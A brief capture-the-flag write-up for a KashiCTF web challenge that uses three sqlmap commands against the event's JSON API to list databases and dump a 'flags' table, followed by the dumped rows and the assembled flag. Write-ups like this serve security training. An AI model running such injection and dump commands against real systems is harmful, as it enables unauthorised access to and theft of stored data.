Similar to corporate life 1 this challenge uses the same api but the flag moved "deeper" this implies another database and due to that I will use sqlmap to find the tables and them dump them.

``` bash
 3189  sqlmap -u "http://kashictf.iitbhucybersec.in:23734/api/list-v2" \\n--method POST \\n--data '{"filter": "*"}' \\n--headers "Content-Type: application/json" \\n--level 5 \\n--risk 3 \\n--batch \\n--dbs --tables
 
 
 3190  sqlmap -u "http://kashictf.iitbhucybersec.in:23734/api/list-v2" \\n--method POST \\n--data '{"filter": "*"}' \\n--headers "Content-Type: application/json" \\n--level 5 \\n--risk 3 \\n--batch \\n--dbs --tables -T flags --columns\n
 
 
 3191  sqlmap -u "http://kashictf.iitbhucybersec.in:23734/api/list-v2" \\n--method POST \\n--data '{"filter": "*"}' \\n--headers "Content-Type: application/json" \\n--level 5 \\n--risk 3 \\n--batch \\n-T flags --columns --dump\n
```

gets you the flag

    +------------+-------------+ | request_id | secret_flag | +------------+-------------+ | 1 | KashiCTF | | 3 | {b0r1ng_o | | 8 | ld_c0rp0 | | 15 | _l1f3_am_ | | 19 | 1_r1gh7_ | | 21 | juxoFQrv} | +------------+-------------+

    KashiCTF{b0r1ng_o ld_c0rp0_l1f3_am_1_r1gh7_juxoFQrv}
